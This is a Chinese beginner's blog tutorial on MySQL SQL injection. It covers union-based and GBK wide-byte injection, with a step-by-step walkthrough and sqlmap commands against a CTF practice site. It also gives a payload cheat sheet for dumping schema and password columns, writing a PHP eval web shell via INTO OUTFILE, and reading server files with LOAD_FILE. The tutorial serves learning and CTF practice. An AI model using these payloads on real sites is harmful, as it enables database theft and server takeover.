<!-- build time:Wed Jun 15 2022 17:00:31 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="Or0kit" href="https://or0kit.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="Or0kit" href="https://or0kit.github.io/atom.xml"><link rel="alternate" type="application/json" title="Or0kit" href="https://or0kit.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="sql注入"><link rel="canonical" href="https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/"><title>初学SQLinjection - web安全 - 渗透测试 | Or0kit</title><meta name="generator" content="Hexo 5.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">初学SQLinjection</h1><div class="meta"><span class="item" title="创建时间：2020-12-02 11:46:32"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2020-12-02T11:46:32+08:00">2020-12-02</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>11k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>10 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Or0kit</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclffsa1cj20zk0m811l.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciusoyjnj219g0u0x56.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PenetrationTest/" itemprop="item" rel="index" title="分类于 渗透测试"><span itemprop="name">渗透测试</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PenetrationTest/Web-Security/" itemprop="item" rel="index" title="分类于 web安全"><span itemprop="name">web安全</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Or0kit"><meta itemprop="description" content=", 临渊羡鱼，不如退而结网"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Or0kit"></span><div class="body md" itemprop="articleBody"><h1 id="前言"><a class="anchor" href="#前言">#</a> 前言</h1><blockquote><p>内容是网上收集的，可能存在错误</p></blockquote><h1 id="sqlinjection-原理"><a class="anchor" href="#sqlinjection-原理">#</a> SQLinjection 原理</h1><p>用户【可控参数】中注入 SQL 语法，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。</p><p>其原因可以归结为以下两个原因叠加造成的：</p><ol><li>程序编写者在处理程序和数据库交互时，使用【字符串拼接】的方式构造 SQL 语句。</li><li>未对【用户可控参数】进行足够的过滤便将参数内容拼接到 SQL 查询语句中。</li></ol><h1 id="sql注入的分类"><a class="anchor" href="#sql注入的分类">#</a> SQL 注入的分类</h1><p>在《web 安全深度剖析》这本书中作者张炳帅前辈认为 SQL 注入只分为数字型与字符型，其他的注入不过是这两大类型的不同展现形式，或不同展现位置罢了。<br>这些都是前辈们的总结</p><ol><li><p><strong>按变量类型分类</strong></p><ul><li>数字型</li><li>字符型</li></ul></li><li><p><strong>按 HTTP 提交方式分类</strong></p><ul><li>GET 注入</li><li>POST 注入</li><li>Cookie 注入</li></ul></li><li><p><strong>按注入方式分类</strong></p><ul><li>报错注入</li><li>盲注</li><li>布尔盲注</li><li>时间盲注</li><li>union 注入</li></ul></li><li><p><strong>编码问题</strong></p><ul><li>宽字节注入</li></ul></li></ol><h1 id="mysql-50以上和mysql-50以下版本的区别"><a class="anchor" href="#mysql-50以上和mysql-50以下版本的区别">#</a> MySQL 5.0 以上和 MySQL 5.0 以下版本的区别</h1><p>MySQL 5.0 以上版本存在一个存储着数据库信息的信息数据库 --INFORMATION_SCHEMA ，其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。而 5.0 以下没有。</p><h2 id="information_schema-库"><a class="anchor" href="#information_schema-库">#</a> INFORMATION_SCHEMA 库</h2><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><h3 id="schemata表"><a class="anchor" href="#schemata表">#</a> SCHEMATA 表</h3><p>储存 mysql 所有数据库的基本信息，包括数据库名，编码类型路径等</p><blockquote><p>我们需要记住该表中记录数据库库名的字段名为 SCHEMA_NAME。</p></blockquote><h3 id="tables表"><a class="anchor" href="#tables表">#</a> TABLES 表</h3><p>储存 mysql 中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><blockquote><p>我们需要记住该表中记录数据库名和表名的字段名分别为 TABLE_SCHEMA 和 TABLE_NAME。</p></blockquote><h3 id="columns表"><a class="anchor" href="#columns表">#</a> COLUMNS 表</h3><p>储存 mysql 中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><blockquote><p>我们需要记住该表中记录数据库库名、表名和字段名的字段名为 TABLE_SCHEMA、TABLE_NAME 和 COLUMN_NAME。</p></blockquote><h1 id="常用的关于information_schema库的sql语句"><a class="anchor" href="#常用的关于information_schema库的sql语句">#</a> 常用的关于 information_schema 库的 SQL 语句</h1><p>需要记住的几个函数</p><ul><li>database ()：当前网站使用的数据库</li><li>version ()：当前 MySQL 的版本</li><li>user ()：当前 MySQL 的用户</li></ul><p>limit 的用法<br>limit m,n 其中 m 是指记录开始的位置，从 0 开始，表示第一条记录；n 是指取 n 条记录。</p><h2 id="查询数据表"><a class="anchor" href="#查询数据表">#</a> 查询数据表</h2><figure class="highlight bash"><figcaption data-lang="bash"><span>h</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">..</span><span class="token punctuation">..</span> union <span class="token keyword">select</span> table_name from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">..</span><span class="token punctuation">..</span> union <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>mysql 的联合查询会把所有的查询结果返回到第一个查询的字段下，在注入过程中常让第一个查询结果错误，这样就只显示你联合查询的结果了</p><h2 id="查询字段"><a class="anchor" href="#查询字段">#</a> 查询字段</h2><figure class="highlight bash"><figcaption data-lang="bash"><span>h</span></figcaption><table><tr><td data-num="1"></td><td><pre>union <span class="token keyword">select</span> <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>,3,4 from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'你查询出来的表名'</span></pre></td></tr></table></figure><h2 id="一句话总结"><a class="anchor" href="#一句话总结">#</a> 一句话总结</h2><p><em><strong>查询数据表与表字段的时候会用到 information_schema 库</strong></em></p><h1 id="sql注入的基本流程"><a class="anchor" href="#sql注入的基本流程">#</a> SQL 注入的基本流程</h1><h2 id="判断是否存在注入点"><a class="anchor" href="#判断是否存在注入点">#</a> 判断是否存在注入点</h2><h2 id="判断注入类型"><a class="anchor" href="#判断注入类型">#</a> 判断注入类型</h2><h2 id="猜字段数量"><a class="anchor" href="#猜字段数量">#</a> 猜字段数量</h2><figure class="highlight bash"><figcaption data-lang="bash"><span>h</span></figcaption><table><tr><td data-num="1"></td><td><pre>order by <span class="token number">1</span><span class="token punctuation">;</span>后面加数字是对查询的第几列排序，从而实现判断字段的个数的目的</pre></td></tr><tr><td data-num="2"></td><td><pre>迭代1~n,直到页面出错（也就是数据库报错了，里面没有这一列。）</pre></td></tr><tr><td data-num="3"></td><td><pre>order by <span class="token number">5</span>  页面正常</pre></td></tr><tr><td data-num="4"></td><td><pre>order by <span class="token number">6</span>  页面错误</pre></td></tr><tr><td data-num="5"></td><td><pre>共有6个字段</pre></td></tr></table></figure><h2 id="看看哪个字段回显"><a class="anchor" href="#看看哪个字段回显">#</a> 看看哪个字段回显</h2><figure class="highlight bash"><figcaption data-lang="bash"><span>h</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">..</span><span class="token punctuation">..</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3,4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>看回显什么数字，就可以知道那个字段回显。</pre></td></tr></table></figure><h2 id="查询数据库名版本用户"><a class="anchor" href="#查询数据库名版本用户">#</a> 查询数据库名，版本，用户</h2><figure class="highlight bash"><figcaption data-lang="bash"><span>h</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">..</span><span class="token punctuation">..</span> union <span class="token keyword">select</span> <span class="token number">1</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,3,4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">..</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">..</span></pre></td></tr></table></figure><h2 id="查询数据表-2"><a class="anchor" href="#查询数据表-2">#</a> 查询数据表</h2><figure class="highlight bash"><figcaption data-lang="bash"><span>h</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">..</span><span class="token punctuation">..</span> union <span class="token keyword">select</span> table_name from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">..</span><span class="token punctuation">..</span> union <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h2 id="查询字段-2"><a class="anchor" href="#查询字段-2">#</a> 查询字段</h2><figure class="highlight bash"><figcaption data-lang="bash"><span>h</span></figcaption><table><tr><td data-num="1"></td><td><pre>union <span class="token keyword">select</span> <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>,3,4 from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'你查询出来的表名'</span></pre></td></tr></table></figure><h2 id="查询数据"><a class="anchor" href="#查询数据">#</a> 查询数据</h2><figure class="highlight bash"><figcaption data-lang="bash"><span>h</span></figcaption><table><tr><td data-num="1"></td><td><pre>union selcet <span class="token number">1</span>,group_concat<span class="token punctuation">(</span>要查询的字段1,字段2,<span class="token punctuation">..</span><span class="token punctuation">..</span>字段n<span class="token punctuation">)</span>,3,4 from 数据表<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>union <span class="token keyword">select</span> <span class="token number">1</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>字段<span class="token punctuation">)</span> from 数据表<span class="token punctuation">)</span>,3,4<span class="token punctuation">;</span></pre></td></tr></table></figure><h1 id="宽字节注入"><a class="anchor" href="#宽字节注入">#</a> 宽字节注入</h1><h2 id="宽字节注入产生的原因"><a class="anchor" href="#宽字节注入产生的原因">#</a> 宽字节注入产生的原因</h2><p>宽字节注入就是用一个大于 128 的十六进制数来吃掉转义符 ```</p><p>gbk 编码，用两个字节作为一个字符的编码.</p><h2 id="宽字节注入的手工注入流程"><a class="anchor" href="#宽字节注入的手工注入流程">#</a> 宽字节注入的手工注入流程</h2><p>1、判断列数：<br><span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 1%23<br><span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 2%23<br><span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 3%23<br>order by 3 时报错，说明只有两列。</p><p>2、各类信息：<br><span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br>union select 2,(concat_ws(char(32,58,32),user(),database(),version()))%23<br><span class="exturl" data-url="bWFpbHRvOnNhZS1jaGluYWxvdmVyQDEyMy4xMjUuMjMuMjEy">sae-chinalover@123.125.23.212</span> : sae-chinalover : 5.5.52-0ubuntu0.14.04.1</p><p>3、库名：<br><span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2 union select 2,database()%23<br>sae-chinalover</p><p>4、表名：<br><span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br>union select 2,group_concat(table_name)<br>from information_schema.tables<br>where table_schema=database()%23<br>ctf,ctf2,ctf3,ctf4,news</p><p>5、ctf4 表的列名：<br><span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br>union select 2,group_concat(column_name)<br>from information_schema.columns<br>where table_name=0x63746634%23<br>id,flag</p><p>这里注意：要将表名 ctf4 转为 16 进制</p><p>这里提供一个字符串转 16 进制的网站：</p><p><span class="exturl" data-url="aHR0cDovL3d3dy41aXh1ZXhpd2FuZy5jb20vc3RyL2hleC5waHA=">http://www.5ixuexiwang.com/str/hex.php</span></p><p>转了 16 进制之后记得在前面加上 0x</p><p this_is_sqli_flag="">6、flag 列的数据：<br><span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br>union select 2,(select flag from ctf4)%23<br>flag</p><h2 id="使用sqlmap进行宽字节注入"><a class="anchor" href="#使用sqlmap进行宽字节注入">#</a> 使用 SQLmap 进行宽字节注入</h2><p>sqlmap 跑法<br>1、查看有哪些库：<br><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u &quot;<span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes --dbs<br>这个时侯就要用到一个脚本了：</p><p>脚本名：<span class="exturl" data-url="aHR0cDovL3VubWFnaWNxdW90ZXMucHk=">unmagicquotes.py</span></p><p>作用：宽字符绕过</p><p>2、表名：<br><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u &quot;<span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D <code>sae-chinalover</code> --tables</p><p>3、列名：<br><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u &quot;<span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D <code>sae-chinalover</code> -T ctf4 --columns</p><p>4、flag 列的数据：<br><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u &quot;<span class="exturl" data-url="aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D <code>sae-chinalover</code> -T ctf4 -C flag</p><h1 id="常用姿势"><a class="anchor" href="#常用姿势">#</a> 常用姿势</h1><h2 id="判断是否存在sql注入"><a class="anchor" href="#判断是否存在sql注入">#</a> 判断是否存在 SQL 注入</h2><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="2"></td><td><pre>and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span></pre></td></tr><tr><td data-num="3"></td><td><pre>-1</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">\</span></pre></td></tr><tr><td data-num="5"></td><td><pre>'</pre></td></tr><tr><td data-num="6"></td><td><pre>"</pre></td></tr></table></figure><h2 id="暴字段长度"><a class="anchor" href="#暴字段长度">#</a> 暴字段长度</h2><p>Order by 数字</p><h2 id="匹配字段"><a class="anchor" href="#匹配字段">#</a> 匹配字段</h2><p>and 1=1 union select 1,2,…,n</p><h2 id="暴字段位置回显位"><a class="anchor" href="#暴字段位置回显位">#</a> 暴字段位置（回显位）</h2><p>and 1=2 union select 1,2,…,n</p><h2 id="利用内置函数暴数据库信息"><a class="anchor" href="#利用内置函数暴数据库信息">#</a> 利用内置函数暴数据库信息</h2><p>version() database() user()</p><h2 id="不用猜解可用字段暴数据库信息有些网站不适用"><a class="anchor" href="#不用猜解可用字段暴数据库信息有些网站不适用">#</a> 不用猜解可用字段暴数据库信息 (有些网站不适用):</h2><p>and 1=2 union all select version()<br>and 1=2 union all select database()<br>and 1=2 union all select user()</p><h2 id="操作系统信息"><a class="anchor" href="#操作系统信息">#</a> 操作系统信息：</h2><p>and 1=2 union all select @@global.version_compile_os from mysql.user</p><h2 id="数据库权限"><a class="anchor" href="#数据库权限">#</a> 数据库权限：</h2><p>and ord (mid (user (),1,1))=114 返回正常说明为 root</p><h2 id="暴库-mysql50"><a class="anchor" href="#暴库-mysql50">#</a> 暴库 (mysql&gt;5.0)</h2><p>Mysql 5 以上有内置库 information_schema，存储着 mysql 的所有数据库和<br>表结构信息</p><p>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from<br>information_schema.SCHEMATA limit 0,1</p><h2 id="猜表"><a class="anchor" href="#猜表">#</a> 猜表</h2><p>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from<br>information_schema.TABLES where TABLE_SCHEMA = 数据库（十六进制） limit 0（开始的记录，0 为第一个开始记录）,1（显示 1 条记录）—</p><h2 id="猜字段"><a class="anchor" href="#猜字段">#</a> 猜字段</h2><p>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from<br>information_schema.COLUMNS where TABLE_NAME = 表名（十六进制）limit 0,1</p><h2 id="暴密码"><a class="anchor" href="#暴密码">#</a> 暴密码</h2><p>and 1=2 Union select 1,2,3, 用户名段，5,6,7, 密码段，8,9 from 表名 limit 0,1 高级用法（一个可用字段显示两个数据内容）：<br>Union select 1,2,3concat (用户名段，0x3c, 密码段),5,6,7,8,9 from 表名 limit 0,1</p><h2 id="直接写马root权限"><a class="anchor" href="#直接写马root权限">#</a> 直接写马 (Root 权限)</h2><p>条件：<br>1、知道站点物理路径<br>2、有足够大的权限（可以用 select …. from mysql.user 测试）<br>3、magic_quotes_gpc()=OFF<br>select ‘<?php eval_r($_POST[cmd])?>’ into outfile ‘物理路径’<br>and 1=2 union all select 一句话 HEX 值 into outfile ‘路径’</p><h2 id="文件读写"><a class="anchor" href="#文件读写">#</a> 文件读写</h2><p>即通过数据库来读写服务器上的文件</p><p>LOAD_FILE(file_name)</p><p>其中 file_name 是文件的完整路径。</p><p>示例:</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'D:/wamp64/tmp/1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>+----------------------------------+</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> load_file<span class="token punctuation">(</span><span class="token string">'D:/wamp64/tmp/1.txt'</span><span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre>+----------------------------------+</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span> <span class="token number">666</span>                              <span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre>+----------------------------------+</pre></td></tr></table></figure><p>select …… into outfile</p><p>outfile 函数可以导出多行，而 dumpfile 只能导出一行数据<br>outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式<br>outfile 函数会在写入的文件最后加一个换行，即多写一行</p><p>实例：</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'a<span class="token entity" title="\n">\n</span>aa<span class="token entity" title="\r">\r</span>aaaa'</span> into outfile <span class="token string">'d:/test1.txt'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Query OK, <span class="token number">1</span> row affected <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'d:/test1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span> load_file<span class="token punctuation">(</span><span class="token string">'d:/test1.txt'</span><span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span> a<span class="token punctuation">\</span></pre></td></tr><tr><td data-num="9"></td><td><pre>aaaa</pre></td></tr><tr><td data-num="10"></td><td><pre>               <span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'a<span class="token entity" title="\n">\n</span>aa<span class="token entity" title="\r">\r</span>aaaa'</span> into dumpfile <span class="token string">'d:/test.txt'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>Query OK, <span class="token number">1</span> row affected <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'d:/test.txt'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    -<span class="token operator">></span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token operator">|</span> load_file<span class="token punctuation">(</span><span class="token string">'d:/test.txt'</span><span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="22"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token operator">|</span> a</pre></td></tr><tr><td data-num="24"></td><td><pre>aaaa                <span class="token operator">|</span></pre></td></tr><tr><td data-num="25"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><p>有一个需要关注的点就是：outfile 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径。这个问题在 php 注入中更加麻烦，因为会自动将单引号转义成 ', 那么基本就 GG 了，但是 load_file，后面的路径可以是单引号、0x、char 转换的字符，但是路径中的斜杠是 / 而不是 \</p><h3 id="mysql新特性secure_file_priv对读写文件的影响"><a class="anchor" href="#mysql新特性secure_file_priv对读写文件的影响">#</a> MYSQL 新特性 secure_file_priv 对读写文件的影响</h3><p>secure-file-priv 特性<br>secure-file-priv 参数是用来限制 LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE () 传到哪个指定目录的。</p><font color="red"><ul><li><p>secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入 | 导出</p></li><li><p>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下</p></li><li><p>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制</p></li></ul></font><p>如何查看 secure-file-priv 参数的值：</p><p><code>show global variables like '%secure%';</code></p><pre><code>+--------------------------+------+
| Variable_name            | Value|
+--------------------------+------+
| require_secure_transport | OFF  |
| secure_auth              | ON   |
| secure_file_priv         | NULL |
+--------------------------+------+
